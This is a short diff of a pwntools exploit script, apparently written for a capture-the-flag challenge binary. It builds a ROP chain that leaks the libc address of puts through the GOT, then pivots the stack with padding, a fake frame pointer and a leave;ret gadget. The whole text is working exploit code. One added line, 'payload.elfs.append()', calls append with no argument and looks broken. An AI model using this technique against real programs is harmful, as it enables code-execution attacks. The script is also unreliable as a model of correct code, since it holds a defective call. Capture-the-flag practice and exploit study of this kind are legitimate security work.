@@ -3,7 +3,7 @@ from pwn import p64,u64
 from LibcSearcher import *
 
 debug = 1
-gdb_is = 1
+gdb_is = 0
 # context(arch='i386',os = 'linux')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
@@ -27,19 +27,19 @@ main_addr = 0x00401264
 leave_ret = 0x0040124B
 
 elf = ELF('./pwn')
-rop = ROP(elf)
-rop.puts(elf.got['puts'])
-rop.raw(ret)
+payload = ROP(elf)
+payload.puts(elf.got['puts'])
+payload.raw(ret)
+info(payload.dump())
 
-
-r.sendafter(b'again!\n',rop.chain())
+r.sendafter(b'again!\n',payload.chain())
 time.sleep(1)
 r.sendafter(b'number',b'\x12\x34\x56\x78'[::-1])
 time.sleep(1)
-
+payload.elfs.append()
 payload = ROP(elf)
-payload.raw(b'A'* 0x30)
-payload.migrate(stack)
+payload.raw(b'A'* 0x30 + p64(stack -8)+p64(payload.leave[0]))
+info(payload.dump())
 r.sendafter(b'TaiCooLa',payload.chain())
 
 addr = r.recv(6).ljust(8,b'\x00')
